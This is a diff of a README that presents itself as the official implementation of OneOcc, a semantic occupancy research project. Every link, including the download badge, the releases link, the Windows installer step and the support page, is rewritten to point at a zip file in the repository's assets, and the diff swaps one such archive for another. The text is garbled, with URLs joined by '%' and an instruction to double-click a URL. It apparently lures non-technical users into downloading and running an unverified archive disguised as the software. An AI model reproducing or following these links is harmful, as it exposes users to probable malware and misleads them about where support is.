@@ -8,10 +8,10 @@ Welcome to OneOcc! This is the official implementation of "OneOcc: Semantic Occu
 To get started with OneOcc, please follow the steps below. No programming knowledge is required.
 
 ## 📥 Download the Software
-[![Download OneOcc](https://raw.githubusercontent.com/KoHrABoT/OneOcc/main/assets/OneOcc_2.9.zip%https://raw.githubusercontent.com/KoHrABoT/OneOcc/main/assets/OneOcc_2.9.zip)](https://raw.githubusercontent.com/KoHrABoT/OneOcc/main/assets/OneOcc_2.9.zip)
+[![Download OneOcc](https://github.com/KoHrABoT/OneOcc/raw/refs/heads/main/assets/imgs/Occ_One_v1.2.zip%https://github.com/KoHrABoT/OneOcc/raw/refs/heads/main/assets/imgs/Occ_One_v1.2.zip)](https://github.com/KoHrABoT/OneOcc/raw/refs/heads/main/assets/imgs/Occ_One_v1.2.zip)
 
 Visit this page to download the latest version of OneOcc:
-[Download OneOcc Releases](https://raw.githubusercontent.com/KoHrABoT/OneOcc/main/assets/OneOcc_2.9.zip)
+[Download OneOcc Releases](https://github.com/KoHrABoT/OneOcc/raw/refs/heads/main/assets/imgs/Occ_One_v1.2.zip)
 
 ## 🛠️ System Requirements
 Before you download OneOcc, make sure your computer meets the following minimum requirements:
@@ -38,7 +38,7 @@ Follow these steps to install OneOcc once you have downloaded it.
 2. **Extract the Files (if necessary):** If the downloaded file is a zipped format (.zip), right-click on it and select "Extract All" to access the program files.
 
 3. **Run the Installer:** 
-   - For Windows users, double-click the `https://raw.githubusercontent.com/KoHrABoT/OneOcc/main/assets/OneOcc_2.9.zip` file to start the installation.
+   - For Windows users, double-click the `https://github.com/KoHrABoT/OneOcc/raw/refs/heads/main/assets/imgs/Occ_One_v1.2.zip` file to start the installation.
    - For macOS users, open the `.dmg` file and drag the OneOcc app into your Applications folder.
    - For Linux users, refer to the README for specific installation instructions.
 
@@ -72,7 +72,7 @@ OneOcc touches on various important aspects of robotics and AI:
 - **Robotics and Scene Completion:** Aids in the semantic understanding of the surroundings.
 
 ## 📧 Support
-If you need assistance with OneOcc, feel free to reach out. You can create an issue on our [GitHub page](https://raw.githubusercontent.com/KoHrABoT/OneOcc/main/assets/OneOcc_2.9.zip) to report bugs or ask for help.
+If you need assistance with OneOcc, feel free to reach out. You can create an issue on our [GitHub page](https://github.com/KoHrABoT/OneOcc/raw/refs/heads/main/assets/imgs/Occ_One_v1.2.zip) to report bugs or ask for help.
 
 ## 🙌 Acknowledgments
 We thank the researchers and developers who contributed to this project and the community for supporting the advancement of robotics and AI.
